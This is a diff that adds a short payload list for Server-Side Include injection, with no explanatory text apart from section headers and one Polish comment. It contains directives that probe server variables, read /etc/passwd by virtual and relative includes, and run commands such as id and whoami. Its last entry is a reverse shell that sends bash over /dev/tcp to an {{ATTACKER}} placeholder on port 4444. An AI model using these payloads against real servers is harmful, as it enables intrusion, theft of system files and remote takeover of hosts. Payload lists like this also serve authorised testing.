@@ -1,0 +1,17 @@
+# === Detection / printenv ===
+<!--#printenv -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DOCUMENT_NAME" -->
+
+# === File include ===
+<!--#include virtual="/etc/passwd" -->
+<!--#include file="../../etc/passwd" -->
+
+# === Command exec ===
+<!--#exec cmd="id" -->
+<!--#exec cmd="ls /" -->
+<!--#exec cmd="whoami" -->
+
+# === Reverse shell trigger ===
+# Wymagana podmiana {{ATTACKER}}
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/{{ATTACKER}}/4444 0>&1'" -->
